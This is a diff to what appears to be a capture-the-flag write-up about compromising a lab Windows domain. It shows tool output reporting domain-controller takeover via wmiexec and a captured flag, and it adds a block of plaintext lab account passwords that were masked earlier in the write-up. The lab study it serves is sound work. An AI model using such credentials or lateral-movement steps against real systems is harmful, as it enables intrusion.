@@ -185,7 +185,9 @@ svc-drop:xxxxxxxxxxxx
 Found Creds j.harris:xxxxxxxxxxxxx2026!
 ```
 #### Pivoting using ligolo-ng
+
 > updating..
+
 #### DC and WRK
 ```bash
 [Intial Access]
@@ -220,6 +222,12 @@ SMB         192.168.11.100  445    DEADDROP-DC      [*] Windows 10 / Server 2019
 SMB         192.168.11.100  445    DEADDROP-DC      [+] deaddrop.loc\j.harris:xxxxxxx (Pwn3d!)
 SMB         192.168.11.100  445    DEADDROP-DC      [+] Executed command via wmiexec
 SMB         192.168.11.100  445    DEADDROP-DC      THM{d34d_dr0p_d0m41n_pwn3d}
+
+[Creds File]
+svc-backup:BackupAgent2024
+admin:SuperSecretAdm1n!
+svc-drop:dropsofjupiter
+j.harris:DropsOfJupiter2026!
 ```
 
 > I am keep updating all Challenge Writeups...
